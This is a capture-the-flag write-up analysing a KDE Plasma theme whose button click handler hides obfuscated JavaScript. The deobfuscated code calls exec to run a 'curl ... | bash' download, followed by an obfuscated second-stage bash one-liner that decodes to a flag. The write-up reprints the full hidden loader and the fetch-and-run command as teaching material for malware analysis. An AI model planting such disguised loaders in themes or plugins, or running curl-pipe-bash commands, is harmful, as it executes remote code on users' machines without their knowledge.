---
title: "This Button is increadibly Sus"
author: w1zardess
tags: ["misc"]
date: 2025-05-01
---

## Challenge

> So I downloaded a theme from the KDE store and I'm worried that my computer is hacked now.

A KDE theme? Lol, I run KDE, although it's probably best not to install a theme that literally has `suspicious` in its name. First things first — we should check the source code and analyze it statically.

## Looking through the source

Reviewing the provided files, two stand out:
- `dist/plasmoids/susbutton/contents/ui/main.qml`
- `Sus.qml` in the same folder


Inside `main.qml` there is suspiciously obfuscated javascript code inside the `onClick` event listener:
```js
// ...
anchors.fill: parent
acceptedButtons: Qt.LeftButton
onClicked:  (mr) => {
	sussy.play();
		var lx=s.ll[0]+s.ll[s.l(2,2)]+s.ll[s.l(s.l(2,2),s.l(2,2))]+s.ll[321-309];var k=+"",e=executable;var f = e[lx];e=s.q;var n=[],sd='bu';n+=[];var l=s.b("UDMctf"),mm=sd;e+=s.$__+s.$___;for(;k<l;k++){n+=e[l*k%67];}var h=8,ff="{}";sd+='rr';var g=f,nn=2;--h; var q=s.b(1);mr=mr[mm+s.su(+[])+s.su(2)+s.r()]; var qq=function(h,p,r){mm+='{';for(;k<67;k++){h+=e[l*k%(s.c(r,p)-mr)]}return h;};n=qq(n,h,24); h = [g,6,12,n];k=s.l([],[]); h[1]=h[0];h[mr-1]=mr;s.p(h[3],s.l,h[1],k); h=ff;n=2;ff=h;(r)=>{while(mr-1){r+=s.q[mr];mr--;}return r;}(s.p); s.p(ff,s.l,()=>{},0);
}
// ...
```

And inside `Sus.qml`, we find the following definition for s:

```js
import QtQuick

Item {
	property var $__: '/21d72pldx|a u t:st.dfocf587/yat bh'
	property var $___: '/2pldx|Mopqfa99\\gyat'
	property var q: 'clts/acmtifa55d3ao.t s rhp/tiuc.'
	property var ll: 'eN+AxblBeKr2c'
	function b(sus) {return sus[3]='c'?45:46;}
	function c(sus,sus2) {return sus2?c(sus*sus%127,--sus2):sus}
	function l($_,_$){return $_+_$;}
	function r(){return 'on'}
	function p (a,b,c,d) {return c(b(a,d)+d);}
	function su(r){return "tlt"[r]}
}
```

## Cleaning up this Mess

To better understand the logic, I reformatted the JavaScript code into a more readable form. Doing so revealed that it primarily depends on three external things:
- The `s` object from `Sus.qml`
- The `mr` event object passed to `onClicked`
- The `executable` object (a Plasma datasource)

## Dynamic analysis

To see which function of `executable` is actually used I mocked the s object and ran this in my browsers javascript console:
```js
var s = {
	$__: '/21d72pldx|a u t:st.dfocf587/yat bh',
	$___: '/2pldx|Mopqfa99\\gyat',
	q: 'clts/acmtifa55d3ao.t s rhp/tiuc.',
	ll: 'eN+AxblBeKr2c',
	b(sus) {return sus[3]='c'?45:46;},
	c(sus,sus2) {return sus2?s.c(sus*sus%127,--sus2):sus}, // make sure to add `s.` infront of c — otherwise it won't find the function in this context
	l($_,_$){return $_+_$;},
	r(){return 'on'},
	p (a,b,c,d) {return c(b(a,d)+d);},
	su(r){return "tlt"[r]},
}

var lx = s.ll[0]+s.ll[s.l(2,2)]+s.ll[s.l(s.l(2,2),s.l(2,2))]+s.ll[321-309];
console.log(lx)
```

This confirms the line `var f = e[lx];` resolves to `var f = executable["exec"];`.

To prevent anything malicious from executing, I patched this line to:

```js
var f = console.log;
```

Now, instead of running whatever command it constructs, it just logs it.

## Handling the Event Object

The script also accesses `mr['button']`. Using this:
```js
mm + s.su(+[]) + s.su(2) + s.r() // yields: 'button'
```
In Plasma, onClicked is only triggered by `Qt.LeftButton`, which maps to `1`. So we substitute:
```js
mr = 1;
```
After this substitution and patch, running the code logs the command:
```bash
curl https://static.umdctf.io/fc2af155d587d723/payload.txt | bash
```

## Investigating the second Stage

The downloaded payload is a heavily obfuscated Bash one-liner:
```bash
"${@//a2::}"  b"a""s"${@,,}h  ${@//+dIsf/6j=V,}   "${@,}"   <<< "$(    "${@%|:Ye3c}" ${*~}   p""r\i$'\u006e'${*#uGE;Y}t$'\x66'  'QlpoOTFBWSZTWV6+ejAAABOfgECBgAkNAgYAv+/+CiAASIkG1A0aAeU9MoNCKNGEPQIaDCM0Qeq7JjaChSBUQyjnHBfDcziPcgeyD7qxoCheMPpv/DUmqA4vWAxSYbGoBdFjcXckU4UJBevnowA=' ${*^} "${@//ET,\!KUP}"  |   ${*^}   $'\x62''a'${*/CP@h\)6}se''"6"4   -d "${@//X~\}8n/E?\`FJa8}"  | ${@,} ${*//qb15\)$v} bu""nz''ip$((   (-(-(17#1--${*//Lx>vi%P\\}2"${@~~}"1#"1")+8"${@/fhA+3}"#0))   ))  -c   ${*,,} "${@//QB3q^du4}"     )"   "${@,}" "${@//MBAu2D}"
```

It `<<<` feeds its input from a nested pipeline into bash.

That pipeline:
- Echoes a base64 blob
- Decodes it
- Decompresses it using bunzip2

We can manually extract and decode the payload with:
```bash
echo 'QlpoOTFBWSZTWV6+ejAAABOfgECBgAkNAgYAv+/+CiAASIkG1A0aAeU9MoNCKNGEPQIaDCM0Qeq7JjaChSBUQyjnHBfDcziPcgeyD7qxoCheMPpv/DUmqA4vWAxSYbGoBdFjcXckU4UJBevnowA=' | base64 -d | bunzip2 -c
```

This results in the output: `echo 'UMDCTF{kde_global_themes_can_be_quite_sus}' > /tmp/.flag; rm /tmp/.flag`. 

Wow — that looks like it contains a flag. And with that I think our job here is done!
